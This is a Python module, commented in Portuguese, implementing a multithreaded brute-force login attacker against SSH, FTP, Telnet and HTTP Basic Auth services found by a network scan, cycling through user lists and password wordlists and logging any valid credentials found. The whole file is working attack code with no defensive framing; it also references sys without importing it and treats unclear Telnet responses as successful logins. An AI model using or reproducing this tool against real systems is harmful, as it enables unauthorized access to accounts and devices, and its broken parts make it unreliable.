#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import socket
import logging
import threading
import queue
import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from colorama import Fore, Style
import warnings

# Ignorar warnings de InsecureRequestWarning do requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Tentar importar bibliotecas opcionais
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import ftplib
    FTPLIB_AVAILABLE = True
except ImportError:
    FTPLIB_AVAILABLE = False

try:
    import telnetlib
    TELNETLIB_AVAILABLE = True
except ImportError:
    TELNETLIB_AVAILABLE = False

# Classe principal do BruteForceAttacker
class BruteForceAttacker:
    """
    Realiza ataques de força bruta em serviços descobertos (SSH, FTP, Telnet, HTTP Basic Auth).

    Utiliza ThreadPoolExecutor para paralelizar as tentativas de login.
    Mostra o progresso usando tqdm.

    Attributes:
        scan_results (dict): Dicionário com resultados do scan {host: {port: details}}.
        users (list): Lista de nomes de usuário a serem testados.
        wordlist_path (str): Caminho para o arquivo contendo a lista de senhas.
        timeout (float): Tempo máximo de espera para cada tentativa de conexão (segundos).
        logger (logging.Logger): Objeto logger para registrar eventos e erros.
        max_workers (int): Número máximo de threads paralelas para o ataque.
    """

    def __init__(self, scan_results, users, wordlist_path, timeout=3.0, max_workers=10, logger=None):
        """
        Inicializa o BruteForceAttacker.

        Args:
            scan_results (dict): Resultados do scan {host: {port: details}}.
            users (list): Lista de usuários.
            wordlist_path (str): Caminho da wordlist de senhas.
            timeout (float, optional): Timeout de conexão em segundos. Padrão: 3.0.
            max_workers (int, optional): Número de threads paralelas. Padrão: 10.
            logger (logging.Logger, optional): Instância do logger. Se None, cria um novo.
        """
        self.scan_results = scan_results
        self.users = users
        self.wordlist_path = wordlist_path
        self.timeout = float(timeout)
        self.max_workers = int(max_workers)
        self.logger = logger or logging.getLogger('wifi_scanner')

        # Mapeia nomes de serviço (lowercase) para funções de brute force
        self.service_map = {}
        if PARAMIKO_AVAILABLE:
            self.service_map['ssh'] = self._brute_force_ssh
        else:
            self.logger.warning("Módulo 'paramiko' não encontrado. Brute force SSH desabilitado.")
        if FTPLIB_AVAILABLE:
             self.service_map['ftp'] = self._brute_force_ftp
        else:
            self.logger.warning("Módulo 'ftplib' não encontrado. Brute force FTP desabilitado.")
        if TELNETLIB_AVAILABLE:
            self.service_map['telnet'] = self._brute_force_telnet
        else:
            self.logger.warning("Módulo 'telnetlib' não encontrado. Brute force Telnet desabilitado.")
        # HTTP/HTTPS sempre disponíveis com requests
        self.service_map['http'] = self._brute_force_http_basic
        self.service_map['https'] = self._brute_force_http_basic
        # Adicionar mapeamentos para outros protocolos aqui (ex: 'smb': self._brute_force_smb)

        # Armazenamento seguro de resultados encontrados
        self.found_credentials = {} # {host: {service_port_str: [(user, pass)]}}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def _load_passwords(self):
        """
        Carrega senhas da wordlist.
        Retorna lista de senhas ou lista vazia em caso de erro.
        """
        passwords = []
        if not os.path.exists(self.wordlist_path):
             self.logger.error(f"Arquivo de wordlist não encontrado: {self.wordlist_path}")
             return []
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            if passwords:
                 self.logger.info(f"Carregadas {len(passwords)} senhas de '{self.wordlist_path}'")
            else:
                 self.logger.warning(f"Wordlist '{self.wordlist_path}' está vazia ou não pôde ser lida.")
        except IOError as e:
            self.logger.error(f"Erro de I/O ao ler arquivo de wordlist '{self.wordlist_path}': {e}")
        except Exception as e:
            self.logger.error(f"Erro inesperado ao carregar wordlist '{self.wordlist_path}': {e}")
        return passwords

    def _attempt_login(self, host, port, service_name, user, password, pbar):
        """
        Worker que tenta um login e atualiza a barra de progresso.
        """
        if self.stop_event.is_set():
            # Se a parada foi solicitada, atualiza a pbar para não travar e retorna
            if pbar: pbar.update(1)
            return

        brute_force_func = self.service_map.get(service_name.lower())
        success = False
        if brute_force_func:
            try:
                success = brute_force_func(host, port, user, password)
            except Exception as e:
                 self.logger.error(f"Erro inesperado ao tentar {service_name} em {host}:{port} com {user}: {e}")
        
        # Processar resultado fora do try/except do ataque
        if success:
            service_port_str = f"{service_name}:{port}" # Usar string como chave
            with self.lock:
                # Inicializa dicionários/listas se não existirem
                self.found_credentials.setdefault(host, {}).setdefault(service_port_str, [])
                # Evita duplicados na lista de credenciais para o mesmo serviço/host
                if (user, password) not in self.found_credentials[host][service_port_str]:
                    self.found_credentials[host][service_port_str].append((user, password))
                    # Logar sucesso IMEDIATAMENTE após encontrar e adicionar
                    self.logger.info(f"{Fore.GREEN}[+] Credenciais Válidas: {host}:{port} ({service_name}) - Usuário: {user} / Senha: {password}{Style.RESET_ALL}")
        
        # Atualizar barra de progresso (ocorre mesmo se a função de brute não existir)
        if pbar: pbar.update(1)

    # --- Métodos específicos de Brute Force para cada serviço --- 

    def _brute_force_ssh(self, host, port, user, password):
        """ Tenta SSH. Retorna True em sucesso, False em falha. """
        if not PARAMIKO_AVAILABLE: return False # Já logado no init
        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username=user, password=password,
                           timeout=self.timeout, allow_agent=False, look_for_keys=False,
                           banner_timeout=self.timeout + 5) # Timeout maior para banner
            return True # Sucesso
        except paramiko.AuthenticationException:
            self.logger.debug(f"Falha SSH Auth: {host}:{port} U:{user} P:{password}")
            return False
        except paramiko.SSHException as e:
            self.logger.warning(f"Erro Conexão SSH {host}:{port} U:{user}: {e}")
            return False
        except socket.timeout:
            self.logger.warning(f"Timeout SSH {host}:{port} U:{user}")
            return False
        except socket.error as e:
             self.logger.warning(f"Erro Socket SSH {host}:{port} U:{user}: {e}")
             return False
        except Exception as e:
            self.logger.error(f"Erro Inesperado SSH {host}:{port} U:{user}: {e}")
            return False
        finally:
            if client: client.close()

    def _brute_force_ftp(self, host, port, user, password):
        """ Tenta FTP. Retorna True em sucesso, False em falha. """
        if not FTPLIB_AVAILABLE: return False
        ftp = None
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=self.timeout)
            ftp.login(user, password)
            # Se login funcionou, tenta fechar graciosamente
            try: ftp.quit() 
            except: pass
            return True # Sucesso
        except ftplib.error_perm as e: # Erro 530 geralmente
            self.logger.debug(f"Falha FTP Auth: {host}:{port} U:{user} P:{password} ({e})")
            return False
        except (socket.timeout, TimeoutError):
             self.logger.warning(f"Timeout FTP {host}:{port} U:{user}")
             return False
        except (socket.error, ftplib.Error) as e: # Captura erros gerais de ftplib também
             self.logger.warning(f"Erro Conexão FTP {host}:{port} U:{user}: {e}")
             return False
        except Exception as e:
             self.logger.error(f"Erro Inesperado FTP {host}:{port} U:{user}: {e}")
             return False
        finally:
             if ftp and ftp.sock: # Verifica se ainda está conectado antes de fechar
                 try: ftp.close() # Usar close() é mais robusto que quit() em caso de erro
                 except: pass

    def _brute_force_telnet(self, host, port, user, password):
        """ Tenta Telnet. Retorna True em sucesso, False em falha. (Experimental) """
        if not TELNETLIB_AVAILABLE: return False
        tn = None
        try:
            tn = telnetlib.Telnet(host, port, timeout=self.timeout)
            # Lógica simplificada, pode falhar em muitos prompts
            login_prompts = [b"login:", b"Login:", b"Username:", b"username:"]
            pass_prompts = [b"Password:", b"password:"]
            # Espera prompt de login, envia usuário
            _, _, text_after_user = tn.read_until(login_prompts[0], timeout=self.timeout/2) # Tenta o primeiro comum
            tn.write(user.encode('ascii', 'ignore') + b"\n")
            # Espera prompt de senha, envia senha
            _, _, text_after_pass = tn.read_until(pass_prompts[0], timeout=self.timeout/2)
            tn.write(password.encode('ascii', 'ignore') + b"\n")
            # Lê um pouco da resposta para verificar falha (muito impreciso)
            time.sleep(0.5) # Dá um tempo para resposta
            response = tn.read_very_eager() 
            tn.close()
            # Verifica indicadores comuns de falha
            failure_indicators = [b"incorrect", b"failed", b"invalid"]
            if any(indicator in response.lower() for indicator in failure_indicators):
                self.logger.debug(f"Falha Telnet (indicador): {host}:{port} U:{user} P:{password}")
                return False
            else:
                # Se não encontrou falha explícita, assume sucesso (PODE SER FALSO POSITIVO)
                 self.logger.debug(f"Possível Sucesso Telnet (sem indicador de falha): {host}:{port} U:{user} P:{password}")
                 return True
        except EOFError:
            self.logger.warning(f"Telnet {host}:{port}: Conexão fechada inesperadamente U:{user}")
            return False # Conexão fechada provavelmente indica falha
        except socket.timeout:
            self.logger.warning(f"Timeout Telnet {host}:{port} U:{user}")
            return False
        except socket.error as e:
            self.logger.warning(f"Erro Socket Telnet {host}:{port} U:{user}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Erro Inesperado Telnet {host}:{port} U:{user}: {e}")
            return False
        finally:
            if tn: 
                try: tn.close()
                except: pass

    def _brute_force_http_basic(self, host, port, user, password):
        """ Tenta HTTP Basic Auth. Retorna True em sucesso, False em falha. """
        protocol = "https" if port == 443 else "http"
        # Tentar caminhos comuns onde Basic Auth pode ser usado
        common_paths = ["/", "/login", "/admin", "/config", "/setup"]
        success = False
        for path in common_paths:
            if self.stop_event.is_set(): break
            url = f"{protocol}://{host}:{port}{path}"
            try:
                response = requests.get(url, auth=HTTPBasicAuth(user, password),
                                        timeout=self.timeout, verify=False, allow_redirects=True)
                # Código 200 indica sucesso, mas verificar se auth foi realmente necessária
                if response.status_code == 200:
                    # Tentar acessar sem autenticação para confirmar que era protegida
                    try:
                        public_response = requests.get(url, timeout=self.timeout/2, verify=False, allow_redirects=True)
                        # Se o acesso público falhar (ex: 401, 403) ou for diferente, a auth funcionou
                        if public_response.status_code != 200:
                            success = True
                            break # Encontrou credencial válida para este path
                        else:
                             # Página é pública, auth não necessária para ESTE PATH
                             self.logger.debug(f"HTTP {url}: Acesso público OK, ignorando cred {user}:{password}")
                             continue # Tenta próximo path
                    except requests.exceptions.RequestException as e_pub:
                         self.logger.debug(f"Erro ao verificar acesso público a {url}: {e_pub}. Assumindo sucesso da auth.")
                         success = True # Assume sucesso se não puder verificar
                         break
                elif response.status_code == 401: # Unauthorized - Falha esperada
                    self.logger.debug(f"Falha HTTP Basic Auth: {url} U:{user} P:{password}")
                    # Se o PRIMEIRO path testado der 401, sabemos que o host usa auth, mas a senha falhou.
                    # Podemos parar de testar outros paths para esta combinação user/pass.
                    if path == common_paths[0]: 
                         break 
                    else:
                        continue # Tenta próximo path
                elif response.status_code == 403: # Forbidden
                     self.logger.debug(f"HTTP {url}: Acesso proibido (403) com {user}:{password}")
                     continue # Tenta próximo path
                else:
                    # Outros códigos (404 Not Found, 5xx Server Error) podem indicar que o path não existe
                    # ou o servidor tem problemas. Continuar tentando outros paths.
                    self.logger.debug(f"HTTP {url}: Status {response.status_code} com {user}:{password}")
                    continue

            except requests.exceptions.Timeout:
                self.logger.warning(f"Timeout HTTP {url} U:{user}")
                break # Se deu timeout, provavelmente dará nos outros paths também
            except requests.exceptions.ConnectionError as e:
                self.logger.warning(f"Erro Conexão HTTP {url} U:{user}: {e}")
                break # Erro de conexão, provavelmente afetará outros paths
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Erro Request HTTP {url} U:{user}: {e}")
                continue # Pode ser erro específico do request, tenta próximo path
            except Exception as e:
                 self.logger.error(f"Erro Inesperado HTTP {url} U:{user}: {e}")
                 continue # Tenta próximo path
        return success

    # --- Método principal de ataque --- 

    def attack(self):
        """
        Orquestra o ataque de força bruta, paralelizando tentativas.
        Retorna dict com credenciais encontradas: {host: {service_port_str: [(user, pass)]}}
        """
        self.found_credentials = {} # Limpa resultados de execuções anteriores
        self.stop_event.clear()

        passwords = self._load_passwords()
        if not self.users or not passwords:
            self.logger.warning("Lista de usuários ou senhas vazia. Abortando brute force.")
            return {}

        # Preparar lista de tarefas (host, port, service_name, user, password)
        tasks = []
        for host, services in self.scan_results.items():
            for port, service_details in services.items():
                # Extrai o nome do serviço do dicionário de detalhes
                service_name = service_details.get('name', 'unknown').lower()
                # Verifica se temos um método de brute force para este serviço
                if service_name in self.service_map:
                    for user in self.users:
                        for password in passwords:
                             tasks.append((host, int(port), service_name, user, password))

        total_attempts = len(tasks)
        if total_attempts == 0:
            self.logger.info("Nenhum serviço compatível com brute force encontrado nos resultados do scan.")
            return {}

        self.logger.info(f"Iniciando brute force com {self.max_workers} threads para {total_attempts} tentativas...")

        # Usar tqdm para a barra de progresso
        # disable=not sys.stdout.isatty() desabilita se não for terminal interativo
        with tqdm(total=total_attempts, desc="Brute Force", unit="attempt", ncols=100, disable=not sys.stdout.isatty()) as pbar:
             # Usar ThreadPoolExecutor para paralelizar as tarefas
             with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                # Submete todas as tarefas
                future_to_task = {executor.submit(self._attempt_login, *task, pbar): task for task in tasks}
                
                try:
                    # Processa os resultados conforme completam (não estritamente necessário aqui,
                    # pois _attempt_login já salva os resultados, mas bom para capturar exceções)
                    for future in as_completed(future_to_task):
                        if self.stop_event.is_set():
                            # Tentar cancelar futuras que ainda não iniciaram
                            for f in future_to_task: f.cancel() 
                            break # Sai do loop as_completed
                        task_info = future_to_task[future]
                        try:
                            future.result() # Pega o resultado (ou exceção) da thread
                        except Exception as exc:
                             # Logar exceção que pode ter ocorrido dentro da thread e não foi pega
                             host, port, service, user, _ = task_info
                             self.logger.error(f"Erro não tratado na thread de brute force {host}:{port} ({service}) U:{user}: {exc}")
                except KeyboardInterrupt:
                     self.logger.warning("\nInterrupção (CTRL+C) detectada durante o brute force.")
                     self.stop() # Sinaliza para parar threads
                     # Cancela futuras que ainda não iniciaram
                     executor.shutdown(wait=False, cancel_futures=True) # Tenta cancelar o resto

        self.logger.info("Ataque de brute force concluído.")
        # Retorna as credenciais encontradas salvas concorrentemente
        return self.found_credentials

    def stop(self):
         """ Sinaliza para parar o ataque de força bruta. """
         if not self.stop_event.is_set():
              self.logger.info("Sinal de parada recebido para o brute force.")
              self.stop_event.set()
